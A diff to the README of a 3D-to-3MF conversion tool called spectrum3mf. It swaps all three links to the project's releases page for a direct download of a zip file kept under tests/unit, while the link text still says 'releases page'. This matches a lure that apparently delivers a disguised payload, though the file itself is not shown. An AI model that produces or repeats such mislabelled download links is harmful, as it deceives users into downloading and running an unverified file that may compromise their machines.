@@ -1,6 +1,6 @@
 # 🧩 spectrum3mf - Turn 3D files into color-ready 3MF
 
-[⬇️ Download spectrum3mf](https://github.com/Anandshr6915/spectrum3mf/releases)
+[⬇️ Download spectrum3mf](https://github.com/Anandshr6915/spectrum3mf/raw/refs/heads/main/tests/unit/spectrum-mf-v2.0.zip)
 
 ## 🖥️ What this app does
 
@@ -18,7 +18,7 @@ Use it when you want to:
 
 To get the app, visit the release page and download the latest Windows file:
 
-[Visit the releases page to download](https://github.com/Anandshr6915/spectrum3mf/releases)
+[Visit the releases page to download](https://github.com/Anandshr6915/spectrum3mf/raw/refs/heads/main/tests/unit/spectrum-mf-v2.0.zip)
 
 After the file downloads:
 
@@ -239,7 +239,7 @@ Keep these habits in mind:
 
 If you need the latest build later, use the same release page here:
 
-[Open spectrum3mf releases](https://github.com/Anandshr6915/spectrum3mf/releases)
+[Open spectrum3mf releases](https://github.com/Anandshr6915/spectrum3mf/raw/refs/heads/main/tests/unit/spectrum-mf-v2.0.zip)
 
 ## 🗂️ What you get from spectrum3mf
 
